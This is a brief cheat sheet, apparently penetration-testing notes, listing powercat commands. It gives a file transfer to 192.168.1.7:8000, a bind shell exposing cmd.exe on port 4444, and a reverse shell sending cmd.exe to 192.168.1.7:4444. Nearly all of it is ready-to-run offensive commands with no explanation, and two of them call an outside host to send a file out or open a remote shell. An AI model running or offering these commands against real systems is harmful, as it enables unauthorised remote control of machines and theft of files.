
Powercat File Transfers:

powercat -c 192.168.1.7 -p 8000 -i C:\Users\limbo\Desktop\file.txt

# Powercat Bind Shells:

powercat -l -p 4444 -e cmd.exe

# Powercat Reverse Shells:

powercat -c 192.168.1.7 -p 4444 -e cmd.exe